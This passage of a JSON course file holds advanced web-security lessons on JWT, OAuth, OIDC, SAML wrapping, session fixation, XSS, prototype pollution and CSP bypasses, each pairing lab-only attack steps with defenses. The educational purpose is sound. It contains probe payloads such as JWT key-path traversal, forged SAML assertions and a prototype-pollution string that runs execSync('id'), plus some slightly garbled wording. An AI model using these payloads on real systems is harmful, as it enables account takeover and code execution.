database-side policy:\n```sql\nCREATE POLICY tenant_isolation ON invoices\n  USING (tenant_id = current_setting('app.tenant_id')::uuid);\n```\nWith this policy, even a query missing the predicate returns only the current tenant's rows.\n\n| Path | Scope source | Leak if omitted |\n|---|---|---|\n| ORM query | Session tenant | Cross-tenant rows |\n| Cache key | Request URL | Wrong tenant's HTML |\n| Search index | Indexed field | Global document set |\n| Background job | Job payload | Batch export of all tenants |\n\n### Bypass and defense pairs\n- Bypass: `X-Tenant-ID` header trusted by a middleware that overrides session scope. Defense: derive tenant solely from the authenticated session and reject conflicting headers.\n- Bypass: cache key based on path only. Defense: include tenant identifier in every shared cache key.\n\n### Common mistakes\n- Trusting a tenant ID from the request body.\n- Applying RLS only to some tables, leaving join tables unguarded.\n- Assuming admin tooling is out of scope; privileged paths are prime targets.\n\n### Knowledge check\n**Q:** Why is RLS stronger than adding `WHERE tenant_id = ?` in application code?\n**A:** Because the database enforces the predicate for every query, including ones written later or issued by tools that forget the filter."
+  },
+  {
+    "id": "web-security-advanced-11",
+    "topic": "web-security-advanced",
+    "number": 11,
+    "title": "JWT Edge Cases: Algorithm, Key, and Claim Confusion",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Analyze JWT validation as a pipeline and exploit gaps between signature verification and claim authorization.",
+    "objectives": [
+      "Enumerate algorithm and key-resolution attacks",
+      "Validate every security-relevant claim",
+      "Prevent cross-service token replay"
+    ],
+    "takeaways": [
+      "The token header must never choose the algorithm",
+      "Key metadata in the token is untrusted",
+      "Signature validity is not authorization"
+    ],
+    "practice": "Against a local API at <LAB_HOST>, decode issued tokens and test alg:none, HS/RS confusion, and audience mismatch in a controlled harness.",
+    "sources": [],
+    "content": "## Core idea\nA JWT is a signed container of claims; its security comes from a signature covering header and payload. Edge-case attacks exploit *validation gaps*: accepting an unsigned token, confusing symmetric and asymmetric keys, trusting key metadata supplied by the token, or verifying the signature without authorizing the claims. The mental model is a pipeline: decode -> pin algorithm -> resolve key -> verify signature -> validate claims -> authorize. Different components often own different stages, and the seams are where bugs live.\n\nKey attack classes: `alg:none` when a verifier skips signature checks; HS/RS confusion where an RS256 public key is reused as an HMAC secret; `kid` values used in path or SQL lookups; `jku`/`x5u` pointing to attacker-controlled key sets; embedded `jwk`; nested JWTs and JWE decryption oracles; and audience confusion where a token for service A is accepted by service B.\n\n### Step-by-step method (lab only)\n1. Decode tokens issued by <LAB_HOST> locally and list every header and payload claim.\n2. Test `alg:none` with an empty signature and with a trailing dot.\n3. Attempt HS256 signing with the service's RS256 public key as the shared secret.\n4. Manipulate `kid` with traversal, null bytes, and SQL metacharacters against your lab key store.\n5. Replay a token issued for a different client or audience and observe whether it is accepted.\n\n### Concrete example\n```json\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../dev/null\"}\n```\nIf the verifier builds a key path from `kid`, traversal can select a predictable file. A classic confusion payload signs with:\n```text\nHMAC-SHA256(publicKeyBytes, header + \".\" + payload)\n```\nwhich succeeds when the verifier switches to HMAC based on the token's own `alg`.\n\n| Claim | Validate | Failure |\n|---|---|---|\n| `iss` | Exact expected string | Token from rogue issuer |\n| `aud` | Exact match, not contains | Cross-service replay |\n| `exp`/`nbf` | Clock with small skew | Indefinite validity |\n| `nonce` | Bound to session | Replay |\n\n### Bypass and defense pairs\n- Bypass: `jku` pointing to an attacker-hosted JWKS. Defense: allowlist JWKS URLs and pin key IDs.\n- Bypass: `aud` as an array where the app only checks membership. Defense: exact single expected audience.\n\n### Common mistakes\n- Reading `alg` from the token instead of a server-side allowlist.\n- Verifying signature but ignoring `exp` and `aud`.\n- Treating JWTs as encrypted; they are only encoded and signed.\n\n### Knowledge check\n**Q:** Why is HS/RS confusion possible at all?\n**A:** Because a public key is public; if the verifier lets the token select HMAC, that public key becomes a guessable shared secret."
+  },
+  {
+    "id": "web-security-advanced-12",
+    "topic": "web-security-advanced",
+    "number": 12,
+    "title": "OAuth 2.0 Edge Cases: Redirects, State, and PKCE",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Examine the three OAuth trust boundaries and how loose redirect matching, state fixation, and PKCE downgrade break them.",
+    "objectives": [
+      "Test redirect URI normalization gaps",
+      "Verify state and PKCE binding",
+      "Identify token leakage channels"
+    ],
+    "takeaways": [
+      "Redirect matching must be exact",
+      "State binds consent to a browser session",
+      "PKCE must be S256 and mandatory"
+    ],
+    "practice": "In a local OAuth lab at <LAB_HOST>, vary redirect URIs and state values to map the authorization server's validation rules.",
+    "sources": [],
+    "content": "## Core idea\nOAuth 2.0 delegates authority through a three-step dance: the authorization server authenticates the user, redirects back to the client with a code, and the client exchanges the code for a token. Bugs concentrate at the boundaries: consent, redirect, and exchange. Each boundary relies on a binding value that must be unforgeable and single-use. When redirect matching is loose, state is predictable or absent, or PKCE is optional, an attacker can substitute themselves into the flow.\n\nThe mental model is a chain of promises. The authorization server promises the code goes only to the registered client; `state` promises the response belongs to the same browser; PKCE promises that whoever redeems the code started the flow. Break one promise and the resulting token is attributed to the wrong party. Note that the implicit flow and fragment-based responses add leakage paths through history and `Referer`.\n\n### Step-by-step method (lab only)\n1. Map the authorize, token, revoke, and device endpoints at <LAB_HOST>.\n2. Test redirect matching: exact, subdomain, suffix, path traversal (`/..`, `/%2e%2e`), and registered-client open redirects.\n3. Test `state`: missing, fixed, predictable, and reflected without session binding.\n4. Test PKCE: absent, `plain` versus `S256`, and swapping the verifier between requests.\n5. Test code reuse and check whether tokens appear in URLs, logs, or `Referer` headers.\n\n### Concrete example\n```http\nGET /oauth/authorize?client_id=lab-client&response_type=code\n  &redirect_uri=https%3A%2F%2F<LAB_HOST>%2F..%2Fevil\n  &state=fixed123 HTTP/1.1\nHost: <LAB_HOST>\n```\nIf the server normalizes `/..` after validation, the code is delivered to the attacker path. A fixed `state` fails to bind the flow to a browser session.\n\n| Control | Binding | Bypass when weak |\n|---|---|---|\n| Redirect URI | Client identity | Code theft |\n| State | Browser session | Login CSRF |\n| PKCE S256 | Initiating client | Code interception |\n\n### Bypass and defense pairs\n- Bypass: suffix matching allows `https://trusted.evil.example` when `https://trusted.example` is registered. Defense: exact string comparison with no normalization.\n- Bypass: `plain` PKCE reveals the verifier in the first request. Defense: require `S256` exclusively.\n\n### Common mistakes\n- Treating `state` as optional because \"PKCE handles CSRF.\"\n- Using implicit flow for single-page apps.\n- Allowing wildcards in registered redirect URIs.\n\n### Additional surface\nDevice authorization flows introduce a second code channel whose user code is short and phishable; polling endpoints must bind the device code to the client. Token leakage commonly occurs when access tokens travel in query strings, are logged by proxies, or are returned in fragments that scripts copy into analytics. In your lab, grep server logs for issued tokens after each flow.\n\n### Knowledge check\n**Q:** Why does a registered client's open redirect undermine OAuth even with strong state?\n**A:** Because the authorization server validates the redirect URI but the client then forwards the code to an attacker-controlled destination."
+  },
+  {
+    "id": "web-security-advanced-13",
+    "topic": "web-security-advanced",
+    "number": 13,
+    "title": "OpenID Connect Validation and Identity Assertion Edge Cases",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Go beyond signature checking to validate issuer, audience, nonce, and contextual claims in OIDC ID tokens.",
+    "objectives": [
+      "Enumerate ID token validation requirements",
+      "Detect cross-client and replay attacks",
+      "Validate contextual claims safely"
+    ],
+    "takeaways": [
+      "An ID token's meaning is contextual",
+      "Audience must match exactly",
+      "Nonce binds the token to one authentication request"
+    ],
+    "practice": "With a lab OIDC provider at <LAB_HOST>, replay an ID token issued to a second client and observe whether your app accepts it.",
+    "sources": [],
+    "content": "## Core idea\nOpenID Connect adds an identity layer to OAuth: the ID token is a signed JWT whose claims assert *who* authenticated, *when*, and *for whom*. A valid signature alone is insufficient because the same signed token may be valid for a different client, at a different time, or in a different browser session. The mental model is a context-bound assertion: the token is meaningful only when issuer, audience, authorized party, nonce, and time all match the expecting relying party.\n\nTypical validation gaps include accepting `aud` arrays with loose membership checks, ignoring `azp` when multiple audiences are present, skipping `nonce`, trusting `acr`/`amr` without policy mapping, and mis-handling `at_hash`/`c_hash`. JWKS retrieval can be poisoned through `kid` confusion, and clock skew can extend `exp`. Logout and revocation are often incomplete, leaving a valid ID token usable after sign-out.\n\n### Step-by-step method (lab only)\n1. Decode an ID token from <LAB_HOST> and list all claims with their values.\n2. For each claim, determine whether the relying party validates it; use a debug endpoint to report validation results.\n3. Request a token for client B and replay it against client A.\n4. Replay the same token in a second browser session to test nonce binding.\n5. Test expiry boundaries by shifting `exp` slightly within allowed skew in your lab signer.\n\n### Concrete example\n```json\n{\n  \"iss\": \"https://<LAB_HOST>\",\n  \"aud\": [\"client-a\", \"client-b\"],\n  \"azp\": \"client-b\",\n  \"sub\": \"1042\",\n  \"nonce\": \"n-8f31\",\n  \"exp\": 1760000000\n}\n```\nIf client A checks only that `aud` contains `client-a`, this token issued to B is accepted. Correct logic requires exact audience match and `azp` equal to the caller's client ID.\n\n| Claim | Required check | Weak check |\n|---|---|---|\n| `iss` | Exact configured URL | Suffix match |\n| `aud` | Exact single value | Array membership |\n| `nonce` | Cookie/session bound | Ignored |\n| `exp` | With small skew | No upper bound |\n\n### Bypass and defense pairs\n- Bypass: token substitution from a second client. Defense: pin expected issuer and audience per relying party.\n- Bypass: nonce reuse across sessions. Defense: store nonce server-side, single-use, tied to the auth request.\n\n### Common mistakes\n- Confusing ID tokens with access tokens; ID tokens are for the client, not for APIs.\n- Trusting `acr` values without mapping them to actual assurance levels.\n- Assuming identity provider compromise is out of scope; pinning JWKS limits damage.\n\n### Knowledge check\n**Q:** When `aud` contains multiple clients, why must `azp` be checked?\n**A:** Because `azp` identifies which client actually requested the token; without it any listed audience can impersonate another."
+  },
+  {
+    "id": "web-security-advanced-14",
+    "topic": "web-security-advanced",
+    "number": 14,
+    "title": "XML Signature Wrapping and SAML Assertion Confusion",
+    "level": "Advanced",
+    "minutes": 90,
+    "summary": "Understand why SAML signatures can validate over one node while the application consumes another, and how to test assertion binding.",
+    "objectives": [
+      "Construct XML Signature Wrapping variants",
+      "Validate conditions and audience restrictions",
+      "Prevent assertion replay"
+    ],
+    "takeaways": [
+      "Signature validation and assertion consumption must resolve the same node",
+      "Duplicate IDs are dangerous",
+      "Conditions need strict clocks"
+    ],
+    "practice": "In a lab IdP at <LAB_HOST>, decode a SAMLResponse and craft a harmless wrapped assertion to see which identity the service provider accepts.",
+    "sources": [],
+    "content": "## Core idea\nSAML assertions are XML, and XML signatures reference a node by ID. XML permits structures where a validator verifies a signature over one element while the application reads a different element with the same or a confusing ID. This is XML Signature Wrapping (XSW). The mental model is two parsers: one that validates and one that consumes. If they resolve different nodes, a valid signature can authenticate an attacker-modified identity.\n\nCommon variants: inserting a second assertion with a changed `NameID` while leaving the signed original in a wrapper; moving the signed assertion into an extension element; copying the signature to a forged assertion; abbreviating with comments so canonicalization sees different text; and namespace confusion. Beyond XSW, conditions such as `AudienceRestriction`, `Recipient`, `NotBefore`, and `NotOnOrAfter` are frequently ignored, and assertions can be replayed until expiry.\n\n### Step-by-step method (lab only)\n1. Capture a SAMLResponse from your lab service provider at <LAB_HOST> and base64-decode it.\n2. Identify `SignedInfo`, the `Reference` URI, and the signed `Assertion` ID.\n3. Build XSW variants that keep the signed node intact but insert a forged assertion with a different `NameID`.\n4. Vary `AudienceRestriction` and `Recipient` to see which conditions are enforced.\n5. Replay a captured assertion after logout to test for replay protection.\n\n### Concrete example\n```xml\n<Response>\n  <Assertion ID=\"A1\"> ...signed, NameID=userA... </Assertion>\n  <Extension>\n    <Assertion ID=\"A1\"> ...forged, NameID=admin... </Assertion>\n  </Extension>\n</Response>\n```\nA validator that finds the first `ID=\"A1\"` and a consumer that finds the last can disagree.\n\n| Variant | Validator sees | Consumer sees |\n|---|---|---|\n| Wrapped copy | Signed original | Forged inner |\n| Duplicate ID | First match | Last match |\n| Comment split | Canonical text | Parsed text |\n\n### Bypass and defense pairs\n- Bypass: duplicate IDs with different `NameID`. Defense: reject documents with duplicate IDs and consume only the signed element.\n- Bypass: NameID confusion using a different attribute as identity. Defense: bind identity to one explicitly configured attribute.\n\n### Common mistakes\n- Assuming \"signature valid\" means \"identity trusted.\"\n- Allowing large clock skew.\n- Using libraries that resolve references by searching the whole document.\n\n### Additional surface\nArtifact binding changes the transport but not the trust: an artifact resolver must enforce the same conditions as a POSTed assertion. Clock skew between IdP and SP can turn an expired assertion into an accepted one, so keep synchronized time and minimal tolerance. Test replay by resubmitting the same assertion after a fresh login.\n\n### Knowledge check\n**Q:** What invariant prevents XSW?\n**A:** The exact element whose signature was verified must be the same element from which identity and attributes are read, with duplicate IDs rejected."
+  },
+  {
+    "id": "web-security-advanced-15",
+    "topic": "web-security-advanced",
+    "number": 15,
+    "title": "Session Fixation and Session Donation Variants",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how a pre-authentication session identifier can survive login and become an authenticated session under attacker control.",
+    "objectives": [
+      "Identify fixation vectors beyond URL parameters",
+      "Verify session rotation on privilege change",
+      "Test invalidation on logout"
+    ],
+    "takeaways": [
+      "Session IDs must be regenerated at authentication",
+      "Cookie scope enables sibling-domain fixation",
+      "Logout must invalidate server state"
+    ],
+    "practice": "In a local lab at <LAB_HOST>, fix an anonymous session ID via a URL parameter, authenticate, and check whether the ID rotates.",
+    "sources": [],
+    "content": "## Core idea\nSession fixation succeeds when a session identifier chosen before authentication remains valid after it. The mental model is a binding: an anonymous session must be *rebound* to an authenticated identity at login by issuing a new identifier. If the old identifier is still accepted, anyone who knew it before login now shares the victim's authenticated session. Variants extend well beyond the classic query-string parameter.\n\nCookie tossing uses a sibling subdomain to set a cookie with `Domain=.lab.<LAB_HOST>` that is sent to the application. Session donation sends the victim a link containing a chosen session ID. Login CSRF forces the victim to authenticate into the attacker's account. Failure to rotate on privilege change, parallel-session retention, and incomplete logout invalidation are related defects. Cookie prefixes (`__Host-`) and `SameSite` mitigate some vectors but not rotation failures.\n\n### Step-by-step method (lab only)\n1. Obtain an anonymous session ID from <LAB_HOST> and note its cookie attributes.\n2. Fix that ID into a second browser via URL parameter, cookie injection, or a sibling subdomain in your lab.\n3. Authenticate the second browser and compare the session ID before and after.\n4. Reuse the original ID from the first browser and check whether it grants authenticated access.\n5. Test logout, password change, and privilege elevation for rotation and invalidation.\n\n### Concrete example\n```http\nGET /?sid=FIXED123 HTTP/1.1\nHost: <LAB_HOST>\nSet-Cookie: session=FIXED123; Domain=.lab.<LAB_HOST>; Path=/\n```\nAfter the victim logs in, the attacker reuses `session=FIXED123`. A correct server responds with a completely new `Set-Cookie` on login and invalidates the old identifier server-side.\n\n| Variant | Fixation channel | Defense |\n|---|---|---|\n| URL parameter | Link | Ignore URL session IDs |\n| Cookie tossing | Sibling domain | `__Host-` prefix |\n| Session donation | Shared link | Rotate on login |\n| Login CSRF | Forced login | Anti-CSRF on login |\n\n### Bypass and defense pairs\n- Bypass: rotation that changes the cookie but leaves the old ID valid. Defense: destroy old server-side session state.\n- Bypass: subdomain cookie overriding due to `Domain` scoping. Defense: use host-only cookies with `__Host-` prefix.\n\n### Common mistakes\n- Assuming `HttpOnly` prevents fixation; it does not.\n- Rotating only at login, not at privilege change.\n- Forgetting that session IDs in URLs leak through referrers and logs.\n\n### Knowledge check\n**Q:** Why is issuing a new cookie insufficient if the old session remains valid server-side?\n**A:** Because an attacker who knows the old identifier can still present it and be mapped to the authenticated session."
+  },
+  {
+    "id": "web-security-advanced-16",
+    "topic": "web-security-advanced",
+    "number": 16,
+    "title": "Authorization Middleware Ordering and Default-Deny",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how guard placement, fallback routes, and field-level checks create function-level authorization gaps.",
+    "objectives": [
+      "Map middleware order to enforcement points",
+      "Enumerate unguarded routes and verbs",
+      "Enforce default-deny policy"
+    ],
+    "takeaways": [
+      "Authorization must be the default, not an opt-in",
+      "Alternate routes and content types are common gaps",
+      "GraphQL needs field-level checks"
+    ],
+    "practice": "On a local app at <LAB_HOST>, enumerate routes and test method overrides and GraphQL aliases for unguarded operations.",
+    "sources": [],
+    "content": "## Core idea\nFunction-level authorization failures often stem from *ordering* rather than missing checks. A framework may route before authenticating, a guard may cover one controller family but not a fallback, or a new endpoint may be added without an explicit policy in a default-allow system. The mental model is a chain: routing -> authentication -> authorization -> handler. A single missing link exposes the resource. The robust design is default-deny: everything is forbidden unless an explicit policy grants it.\n\nGraphQL adds granularity. Authorizing the operation as a whole is insufficient when fields carry different sensitivity, and aliases or fragments can restructure a query so that a field-based filter misses it. Bulk endpoints are another gap: the request may be authorized once while individual items are not. Alternate content types, method overrides, and internally routed paths can bypass a URL-based guard.\n\n### Step-by-step method (lab only)\n1. Map middleware order at <LAB_HOST> using a debug route that logs which guards ran.\n2. Enumerate routes including static paths, API prefixes, and framework-generated endpoints.\n3. Test each with different verbs and `X-HTTP-Method-Override` headers.\n4. In GraphQL, test restricted fields through aliases, fragments, and variables.\n5. Request an intentionally nonexistent route to check whether the fallback denies by default.\n\n### Concrete example\n```http\nPOST /graphql HTTP/1.1\nHost: <LAB_HOST>\nAuthorization: Bearer <TOKEN_B>\nContent-Type: application/json\n\n{\"query\":\"{ user(id:\\\"A\\\"){ email internalNotes } }\"}\n```\nIf only the top-level `user` field is authorized, `internalNotes` leaks. A method-override probe:\n```http\nPOST /api/invoices/1042 HTTP/1.1\nHost: <LAB_HOST>\nX-HTTP-Method-Override: DELETE\n```\n\n| Guard placement | Gap |\n|---|---|\n| Route-level only | New routes unprotected |\n| Method-based | Override headers |\n| Query-level only | Sensitive nested fields |\n\n### Bypass and defense pairs\n- Bypass: alias renaming a restricted field. Defense: authorize by field definition, not response key.\n- Bypass: fallback route that renders any template by name. Defense: default-deny and explicit allowlists.\n\n### Common mistakes\n- Testing only documented endpoints.\n- Assuming a 401 implies authorization was checked.\n- Relying on front-end hiding to enforce function-level policy.\n\n### Additional surface\nBulk operations deserve special scrutiny: a single authorized request may return or mutate hundreds of objects whose individual permissions were never checked. Alternate content types such as form-encoded versus JSON can select different code paths with different guards. Enumerate both in your local test matrix.\n\n### Knowledge check\n**Q:** Why is default-deny more robust than enumerating protected routes?\n**A:** Because new endpoints are safe by construction; an forgotten route fails closed instead of open."
+  },
+  {
+    "id": "web-security-advanced-17",
+    "topic": "web-security-advanced",
+    "number": 17,
+    "title": "DOM XSS Sink Taxonomy and Taint Tracking",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Build a source-to-sink mental model for DOM XSS across classic, jQuery, and framework-specific sinks.",
+    "objectives": [
+      "Classify sources and sinks by context",
+      "Trace taint through string operations",
+      "Choose context-correct sanitizers"
+    ],
+    "takeaways": [
+      "DOM XSS is a dataflow problem",
+      "Each sink has a required context",
+      "Framework escape hatches are sinks too"
+    ],
+    "practice": "On a local page at <LAB_HOST>, use DevTools breakpoints on candidate sinks and confirm a harmless marker reaches execution.",
+    "sources": [],
+    "content": "## Core idea\nDOM XSS is a taint-flow problem: untrusted data from a source reaches a dangerous sink without context-appropriate neutralization. Sources include `location`, `document.referrer`, `postMessage`, storage, and WebSocket messages. Sinks include `eval`, `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `location` assignments, `jQuery.html()`, `dangerouslySetInnerHTML`, and Angular's `bypassSecurityTrustHtml`. The crucial refinement is context: HTML text, quoted attribute, URL, and JavaScript each require different defenses.\n\nThe mental model is a graph. Nodes are values; edges are assignments, concatenations, and templating. A value is tainted if any path from a source reaches it un-sanitized. String operations such as `replace`, `split`, and template literals do not remove taint. Because the browser executes the final string, the sink determines which interpretation applies. Encoding for the wrong context is a common failure.\n\n### Step-by-step method (lab only)\n1. Search the client source at <LAB_HOST> for sink patterns and set DevTools breakpoints on them.\n2. For each sink, walk backward to its sources using the call stack and variable tracing.\n3. Inject a unique marker and observe where it lands in the DOM.\n4. Classify the context and test only the characters relevant to that context.\n5. Verify with a harmless execution marker, then confirm the fix with the same payload.\n\n### Concrete example\n```js\nconst id = new URLSearchParams(location.search).get('id');\ndocument.getElementById('out').innerHTML = '<b>' + id + '</b>';\n```\nHere the sink is `innerHTML` in an HTML context; encode `<`, `>`, and `&`, or better use `textContent`:\n```js\ndocument.getElementById('out').textContent = id;\n```\n\n| Sink | Context | Safer alternative |\n|---|---|---|\n| `innerHTML` | HTML | `textContent` |\n| `location` | URL | Allowlist scheme |\n| `eval` | JavaScript | Avoid entirely |\n| `jQuery.html()` | HTML | `.text()` |\n\n### Bypass and defense pairs\n- Bypass: double encoding that a single decode pass misses. Defense: decode once, validate, then encode for the destination context.\n- Bypass: `javascript:` URL in a location sink. Defense: allowlist `http`/`https` schemes.\n\n### Common mistakes\n- Applying HTML entity encoding to a URL sink.\n- Trusting sanitizers that only strip tags; attributes and URLs still execute.\n- Ignoring third-party scripts that introduce their own sinks.\n\n### Additional surface\nRemember that taint can enter from storage and postMessage, not only the URL. A value written to localStorage by one script may later be read and inserted into the DOM of another page on the same origin. Trace backward through every read, including event handlers and third-party widgets.\n\n### Knowledge check\n**Q:** Why does `textContent` eliminate this class of bug for text insertion?\n**A:** Because it creates a text node; the browser never parses the value as markup, so no markup context exists."
+  },
+  {
+    "id": "web-security-advanced-18",
+    "topic": "web-security-advanced",
+    "number": 18,
+    "title": "Mutation XSS: Parser Round-Trip Instability",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how sanitized markup can become executable after serialization and re-parsing in a different namespace context.",
+    "objectives": [
+      "Explain mutation XSS mechanics",
+      "Craft namespace-confusion probes",
+      "Verify sanitizer round-trip safety"
+    ],
+    "takeaways": [
+      "Serialization is not identity",
+      "SVG and MathML change parsing rules",
+      "Sanitizers must account for the destination context"
+    ],
+    "practice": "In a lab at <LAB_HOST> with an innerHTML-based sanitizer, feed a harmless mutation payload and compare the DOM before and after a serialize/parse round trip.",
+    "sources": [],
+    "content": "## Core idea\nMutation XSS (mXSS) occurs when markup is parsed into a DOM, sanitized or serialized, and then parsed again into a *different* tree that contains executable content. The mental model is parser round-trip instability: `parse(s) -> DOM -> serialize -> s'` where `s'` does not reproduce the original tree. Namespaces are the main engine of mutation: inside `<svg>` or `<math>`, element and attribute rules differ, and transitioning out of them can place text into unexpected contexts. `noscript`, `style`, `template`, and comments add further quirks because their content is parsed with scripting-state-dependent rules.\n\nA sanitizer may see a harmless tree, serialize it, and the browser then reparse the string with the scripting flag enabled, turning inert text into tags. DOMPurify and browser parsers have both seen such bugs historically, so the lesson is to test the exact serialization path your application uses rather than trusting a library name.\n\n### Step-by-step method (lab only)\n1. Locate a flow at <LAB_HOST> that assigns sanitized content to `innerHTML` and later reads or reuses it.\n2. Craft payloads combining `<svg>`, `<math>`, `<noscript>`, `<style>`, and comments with a harmless marker.\n3. Compare `element.innerHTML` before and after a forced round trip in DevTools.\n4. Test in more than one browser engine, since scripting-state handling differs.\n5. Confirm execution with an innocuous marker, then verify the patched sanitizer blocks it.\n\n### Concrete example\n```html\n<noscript><p title=\"</noscript><img src=x data-mark=1>\">\n```\nWith scripting enabled, the browser's reparse can close `noscript` inside the attribute and surface an `<img>` element. A marker attribute (`data-mark`) lets you verify the mutation without real harm.\n\n| Mechanism | Why it mutates |\n|---|---|\n| SVG/MathML namespace | Different tag and attribute parsing |\n| noscript | Scripting flag changes content model |\n| Comments | Serialization can split text |\n| style raw text | Energy until closing tag differs |\n\n### Bypass and defense pairs\n- Bypass: sanitize once, then reassign the serialized string to `innerHTML`. Defense: sanitize at the final sink and avoid re-parsing.\n- Bypass: namespace transition that hides a tag from the sanitizer. Defense: configure the sanitizer for the destination namespace and disallow SVG/MathML when unnecessary.\n\n### Common mistakes\n- Testing `document.write` behavior when the app uses `innerHTML`.\n- Assuming one browser's behavior generalizes.\n- Using blacklist tag stripping instead of a vetted sanitizer.\n\n### Knowledge check\n**Q:** Why can a sanitized string become dangerous after serialization?\n**A:** Because the serializer emits a string whose reparse tree differs from the sanitized tree, potentially exposing executable elements."
+  },
+  {
+    "id": "web-security-advanced-19",
+    "topic": "web-security-advanced",
+    "number": 19,
+    "title": "Prototype Pollution to RCE in Node Applications",
+    "level": "Advanced",
+    "minutes": 90,
+    "summary": "Trace prototype pollution from unsafe merge operations through Node gadgets to command execution in server-side templates.",
+    "objectives": [
+      "Find pollution sources in merges and query parsers",
+      "Identify exploitable gadgets",
+      "Build a defense-in-depth fix"
+    ],
+    "takeaways": [
+      "Pollution is a write to a shared prototype",
+      "Gadgets turn properties into execution",
+      "Filtering one key path is insufficient"
+    ],
+    "practice": "In a local Node app at <LAB_HOST>, send a harmless `__proto__` payload and observe a debug route dumping `Object.prototype`.",
+    "sources": [],
+    "content": "## Core idea\nPrototype pollution occurs when attacker-controlled keys write to `__proto__` or `constructor.prototype` during a recursive merge, clone, or path assignment. The result is a property on a shared prototype inherited by many objects. Alone that is often noisy; impact comes from *gadgets*: code paths that read a configurable property from an object and use it dangerously. In Node, classic gadgets live in template engines and child-process helpers, where a polluted property becomes a template string or execution option.\n\nThe mental model is a two-stage chain. Stage one is a write primitive into `Object.prototype`. Stage two is a read of that property in a sensitive context, such as EJS's `outputFunctionName`, a view engine option, or a command option. Security teams often fix stage one by blocking the literal `__proto__` key, but `constructor.prototype` and nested variants bypass such filters.\n\n### Step-by-step method (lab only)\n1. Find merge/clone/query-parsing code in the app at <LAB_HOST>.\n2. Submit JSON containing `__proto__` and `constructor.prototype` keys with a harmless marker value.\n3. Use a debug route to inspect `Object.prototype` and confirm pollution.\n4. Enumerate gadgets: render options, template engine settings, path options, and child-process options.\n5. Chain the polluted property into a gadget and verify with an innocuous marker command.\n\n### Concrete example\n```js\nfunction merge(target, src) {\n  for (const k in src) {\n    if (typeof src[k] === 'object') merge(target[k], src[k]);\n    else target[k] = src[k];\n  }\n}\n```\nSending the following can pollute a template option:\n```json\n{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id');//\"}}\n```\nWhen EJS compiles a template, the polluted option is interpolated into generated code.\n\n| Gadget | Polluted property | Effect |\n|---|---|---|\n| EJS | `outputFunctionName` | Code injection |\n| View options | `root`/`filename` | Path control |\n| lodash template | `sourceURL` | Source injection |\n\n### Bypass and defense pairs\n- Bypass: block only `__proto__`, attacker uses `constructor.prototype`. Defense: reject both and use `Object.create(null)` for dictionaries.\n- Bypass: pollution via array index keys. Defense: validate key names against an allowlist and freeze critical prototypes.\n\n### Common mistakes\n- Treating pollution as \"just a DoS\" without hunting gadgets.\n- Patching a single library instead of fixing the merge utility.\n- Forgetting that client-side pollution affects DOM sinks too.\n\n### Additional surface\nPrototype pollution is not server-only: client-side merge utilities can pollute Object.prototype and then change DOM behavior or sanitizer configuration. Use a JSON reviver that rejects dangerous keys, and keep critical configuration in Object.create(null) maps so inherited properties cannot influence decisions.\n\n### Knowledge check\n**Q:** Why is freezing `Object.prototype` a useful defense-in-depth measure?\n**A:** Because it makes the shared prototype immutable, so even a missed pollution source cannot install gadget properties."
+  },
+  {
+    "id": "web-security-advanced-20",
+    "topic": "web-security-advanced",
+    "number": 20,
+    "title": "Content Security Policy Bypass Techniques",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn to read CSP as a trust policy and find permitted sources that can host or reflect attacker-controlled script.",
+    "objectives": [
+      "Parse CSP directives and identify weak sources",
+      "Exploit nonce and base-uri weaknesses",
+      "Design a strict CSP"
+    ],
+    "takeaways": [
+      "CSP bypasses exploit trust exceptions",
+      "Nonces must be unpredictable and single-use",
+      "strict-dynamic shifts trust to loaders"
+    ],
+    "practice": "Against a local page at <LAB_HOST>, inspect response headers and test whether a static nonce permits injection of a harmless script.",
+    "sources": [],
+    "content": "## Core idea\nA Content Security Policy is a whitelist of origins and execution rules for scripts and other resources. Bypasses rarely \"break\" the parser; they exploit exceptions the policy intentionally allows. The mental model is to ask: which permitted source can I make serve my code, or which directive can I weaken by injecting markup? Common levers are predictable or reused nonces, `strict-dynamic` trusting a loader that can be manipulated, JSONP or file-upload endpoints on allowed origins, missing `base-uri`, plugin-capable `object-src`, and header injection that adds a second policy.\n\nReading a policy correctly matters: multiple `script-src` values are treated as one, and `default-src` is only a fallback. A policy with `'unsafe-inline'` plus a nonce is effectively inline-allowed in older browsers that ignore nonces.\n\n### Step-by-step method (lab only)\n1. Fetch response headers from <LAB_HOST> and parse each directive.\n2. Check nonce entropy, reuse across responses, and whether the nonce is reflected into HTML.\n3. Look for JSONP, template, or upload endpoints on allowed origins that reflect attacker text.\n4. Test missing `base-uri` by injecting a `<base>` tag to redirect relative script URLs.\n5. Test dangling markup to extract a nonce from a later script tag.\n\n### Concrete example\n```http\nContent-Security-Policy: default-src 'self'; script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'\n```\nA static nonce permits:\n```html\n<script nonce=\"abc123\">/* harmless marker */</script>\n```\nWith `strict-dynamic`, any script loaded by a trusted loader becomes trusted, so an allowed JSONP endpoint becomes a script-hosting primitive.\n\n| Directive | Weakness | Bypass |\n|---|---|---|\n| `script-src` | Nonce reuse | Injected script with nonce |\n| `base-uri` | Missing | Relative script redirect |\n| `object-src` | Permissive | Plugin execution |\n| `frame-ancestors` | Absent | Clickjacking |\n\n### Bypass and defense pairs\n- Bypass: JSONP callback reflection on an allowed origin. Defense: remove JSONP and allowlist exact script URLs.\n- Bypass: dangling markup steals a nonce. Defense: generate a fresh cryptographically random nonce per response and never reflect it before the script.\n\n### Common mistakes\n- Relying on `unsafe-inline` together with nonces.\n- Forgetting `base-uri` and `object-src`.\n- Assuming CSP replaces output encoding; it is defense in depth.\n\n### Additional surface\nRemember that CSP is layered defense: frame-ancestors replaces X-Frame-Options, and Trusted Types can eliminate DOM sinks by requiring typed values. A policy without object-src none or with permissive frame-src leaves non-script execution paths open even when script-src is tight.\n\n### Knowledge check\n**Q:** Why does nonce reuse across responses defeat nonce-based CSP?\n**A:** Because a 